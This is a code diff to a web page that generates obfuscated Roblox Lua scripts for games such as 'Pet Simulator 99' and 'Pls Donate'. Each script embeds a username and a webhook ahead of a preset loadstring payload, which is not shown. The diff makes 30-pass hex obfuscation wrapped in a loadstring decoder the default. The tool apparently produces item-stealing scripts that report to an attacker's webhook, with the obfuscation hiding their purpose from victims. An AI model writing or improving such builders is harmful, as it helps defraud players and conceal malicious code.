@@ -61,8 +61,7 @@
             <option value="Pet Simulator 99">Pet Simulator 99</option>
             <option value="Pls Donate">Pls Donate</option>
         </select>
-        <label><input type="checkbox" id="obfuscate-option"> Enable Obfuscation</label>
-        <label><input type="checkbox" id="auto-obfuscate-option"> Auto Obfuscate 20x</label>
+        <label><input type="checkbox" id="auto-obfuscate-option"> Auto Obfuscate 30x</label>
         <button onclick="generateScript()">Generate Script</button>
     </div>
     <script>
@@ -84,16 +83,14 @@
         return result;
     }
 
-    function obfuscateScript(script, auto) {
-        let times = auto ? 40 : 1;
-        return `return(function(...)local P={'${multiHexObfuscate(script, times)}'} for i=1,#P do P[i]=string.char(P[i]:match("\\x(%x%x)")) end loadstring(table.concat(P))(...) end)(...)`;
+    function obfuscateScript(script) {
+        return `return(function(...)local P={'${multiHexObfuscate(script, 30)}'} for i=1,#P do P[i]=string.char(P[i]:match("\\x(%x%x)")) end loadstring(table.concat(P))(...) end)(...)`;
     }
 
     function generateScript() {
         let username = document.getElementById('username').value;
         let webhook = document.getElementById('webhook').value;
         let selectedScript = document.getElementById('script-select').value;
-        let obfuscate = document.getElementById('obfuscate-option').checked;
         let autoObfuscate = document.getElementById('auto-obfuscate-option').checked;
 
         if (!username || !webhook) {
@@ -104,8 +101,8 @@
         let script = `Username = "${username}"
 Webhook = "${webhook}" ${loadstrings[selectedScript]}`;
 
-if (obfuscate) {
-            script = obfuscateScript(script, autoObfuscate);
+if (autoObfuscate) {
+            script = obfuscateScript(script);
         }
         
         downloadScript(script);
